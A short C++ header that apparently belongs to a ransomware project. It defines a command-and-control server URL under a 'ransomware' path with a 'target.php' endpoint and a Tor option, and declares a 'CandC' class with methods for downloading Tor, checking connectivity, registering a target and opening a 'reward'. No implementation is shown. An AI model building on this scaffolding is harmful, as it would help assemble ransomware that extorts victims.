#ifndef __AFTER_DAY__
#define __AFTER_DAY__
#endif

#include <iostream>
#include <stdlib.h>

#define HOST "http://localhost/ransomware/"
#define PATH "target.php"
#define __TOR_USED__ 0

class CandC
{
    public:
	int hello(void);
	int download_tor(void);
	int checkifconnected(void);
	int insert_target(void);
	int openReward(void);
	std::string nb_file;
};
